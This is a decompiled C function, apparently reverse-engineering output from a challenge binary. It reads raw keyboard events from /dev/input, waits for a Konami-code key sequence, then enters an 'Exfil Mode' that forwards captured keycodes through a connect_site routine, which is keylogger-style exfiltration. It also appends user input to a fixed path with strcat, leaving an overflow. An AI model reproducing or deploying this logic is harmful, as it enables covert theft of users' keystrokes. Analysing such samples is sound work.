void read_maypad(char *userInput)

{
  undefined4 local_8c;
  uint sumNumbersIDK [10];
  char readBuffer [30];
  undefined8 filePath;
  undefined4 local_30;
  astruct *fileHandle;
  bool continueLooping;
  int index;
  bool bVar1;
  
  filePath = 0x706e692f7665642f;
  local_30 = 0x2f7475;
  strcat((char *)&filePath,userInput);
  fileHandle._0_4_ = open((char *)&filePath,0);
  if ((int)fileHandle == -1) {
    perror("Cannot access device.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  index = 0;
  bVar1 = true;
  sumNumbersIDK[0] = 0x67;
  sumNumbersIDK[1] = 0x67;
  sumNumbersIDK[2] = 0x6c;
  sumNumbersIDK[3] = 0x6c;
  sumNumbersIDK[4] = 0x69;
  sumNumbersIDK[5] = 0x6a;
  sumNumbersIDK[6] = 0x69;
  sumNumbersIDK[7] = 0x6a;
  sumNumbersIDK[8] = 0x30;
  sumNumbersIDK[9] = 0x1e;
LAB_00400d6c:
  while (bVar1) {
    read((int)fileHandle,readBuffer,0x18);
    if ((readBuffer._16_2_ == 1) && (readBuffer._20_4_ == 1)) {
      if ((uint)readBuffer._18_2_ == sumNumbersIDK[index]) {
        index = index + 1;
      }
      else {
        index = 0;
      }
      if (index == 10) {
        puts("Entering Exfil Mode.");
        bVar1 = false;
      }
    }
  }
  read((int)fileHandle,readBuffer,0x18);
  if (((readBuffer._16_2_ == 1) && (readBuffer._20_4_ == 1)) && (readBuffer._18_2_ == 0x1e)) {
    index = 0;
    do {
      read((int)fileHandle,readBuffer,0x18);
      if ((readBuffer._16_2_ == 1) && (readBuffer._20_4_ == 1)) {
        if (readBuffer._18_2_ != 0x1e) goto LAB_00400e51;
        index = index + 1;
      }
      if (index == 2) {
        local_8c = 0x616161;
        connect_site(&local_8c);
        remove("/tmp/maypad.pid");
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    } while( true );
  }
  goto LAB_00400ed8;
LAB_00400e51:
  fileHandle._4_4_ = 0;
  while (fileHandle._4_4_ < index) {
    connect_site(keycode._240_8_);
    sleep(0);
    fileHandle._4_4_ = fileHandle._4_4_ + 1;
  }
  connect_site(*(undefined8 *)(keycode + (long)(int)(uint)readBuffer._18_2_ * 8));
LAB_00400ed8:
  if ((readBuffer._16_2_ == 1) && (readBuffer._20_4_ == 1)) {
    connect_site(*(undefined8 *)(keycode + (long)(int)(uint)readBuffer._18_2_ * 8));
  }
  goto LAB_00400d6c;
}
